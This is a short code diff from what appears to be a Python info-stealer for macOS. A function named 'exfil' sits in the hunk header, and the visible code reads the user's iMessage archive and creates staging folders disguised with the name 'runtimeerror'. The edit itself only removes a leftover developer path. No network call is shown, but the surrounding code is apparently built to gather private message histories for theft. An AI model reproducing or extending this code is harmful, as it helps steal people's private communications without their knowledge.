@@ -28,7 +28,7 @@ def exfil(fp, fn):
 
 def convert_extract_copy():
     dir = os.path.expanduser('~')+"/Library/Messages/Archive"
-    directory = dir#'/Users/amigo/Desktop'
+    directory = dir
 
     os.mkdir(os.path.expanduser('~')+"/temp/")
     os.mkdir(os.path.expanduser('~')+"/temp/"+"runtimeerror")
